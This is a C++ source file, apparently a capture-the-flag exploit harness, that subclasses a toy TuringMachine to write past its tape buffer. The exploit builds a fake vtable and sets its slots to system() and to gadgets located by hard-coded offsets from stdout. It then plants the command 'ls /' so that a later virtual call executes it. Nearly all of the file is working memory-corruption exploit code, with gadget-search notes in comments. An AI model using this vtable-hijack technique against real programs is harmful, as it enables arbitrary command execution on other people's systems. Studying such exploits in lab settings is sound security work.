#include "turingmachine.h"
#include <unistd.h>

class ExploitTuringMachine : public TuringMachine {
public:
	inline ExploitTuringMachine(uint8_t *tapeStart, uint8_t *tapeEnd) : TuringMachine(tapeStart, tapeEnd) {}

	bool run(int steps) override {
		for (int i = 0; i < steps; i++) {
			fprintf(stderr, "- step %04d:  state=%d  head=%p\n", i, state, head);
			if (head < tapeStart || head >= tapeEnd) {
				std::cerr << "Head is out of tape!\n";
				return false;
			}
			switch (state) {
				case 0: {
					head += 40;
					state = 1;
					break;
				}
				case 1: {
					*((uintptr_t *) head) = 0;
					head += 8;
					state = 2;
					break;
				}
				case 2: {
					*((uintptr_t *) head) = -1;
					head -= 16;
					state = 3;
					break;
				}

				case 3: {
					// head now at beginning of machine
					fprintf(stderr, "(read 8) => %p\n", *((void**) head));
					fprintf(stderr, "vtable at %p - %p\n", head-64, head-32);

					// fake vtable pointer
					*((void**) head) = (void*) (head - 64);
					// vtable [0] <-- rax
					*((void**) (head-64)) = (void*) system;
					// vtable [8] = mov rdi, rbp ; call qword ptr [rax + 0x20]
					// *((void**) (head-48)) = (void*) system;
					*((void**) (head-56)) = (void*) (((char*)stdout) -668706);
					// vtable [0x20] = call qword ptr [rax + 0x18]
					// list(elf.search(asm('call qword ptr [rax + 0x18]')))[0] - elf.symbols['_IO_2_1_stdout_']
					*((void**) (head-32)) = (void*) (((char*)stdout) -1450612);
					// vtable [0x18] = system
					*((void**) (head-40)) = (void*) system;

					memcpy(head + 0x40, "ls /", 5);
					fprintf(stderr, "GO!\n");
				}
				default:
					// asm("int3");
					return true;
			}
		}
		return false;
	}

	const char *stateName(int state) override {
		switch (state) {
			case 0: return "0";
			case 1: return "1";
			default:
				return "?";
		}
	}
};

/*
uint8_t tape[] = "\x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000XYZ";
#define tape_size 96
ExploitTuringMachine machine(tape, tape + tape_size);
//ExploitTuringMachine machine{tape, tape + tape_size, tape};
//TuringMachine *machine = new ExploitTuringMachine(tape, tape + tape_size);
 */
uint8_t *tape = "\x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000XYZ"_tape;
constexpr size_t tape_size = 96;
TuringMachine *machine = new ExploitTuringMachine(tape, tape + tape_size);
FinalStateReporter *reporter = new FinalStateReporter(stdout);

int main() {
	// pmap();
	// machine @ tape+0x20
	// stdout @ machine+0x40
	// system = stdout -1667960

	// virtual call: rdi = address of object  rax = address of vtable slot     call [rax+X]
	// rdi --> vtable_ptr --> [?] [gadget] [...]

	/*
	 * y = list(elf.search(asm('call [rax]')))
	 * _IO_2_1_stdout_
	 */

	fprintf(stderr, "&tape    = %p\ntapedata = %p\ntape end = %p\nmachine  = %p\nreporter = %p\n", &tape,  tape, tape + tape_size, machine, reporter);
	fprintf(stderr, "stdout   = %p\n", stdout);

	hexview(tape+0x60, 0x10);

	bool terminated = machine->run(1000);
	//fflush(stderr);
	//usleep(10);

	reporter->reportFinalState(machine->state, machine->stateName(machine->state));
	reporter->reportFinalTape(tape, tape_size);

	return terminated ? 0 : 1;
}
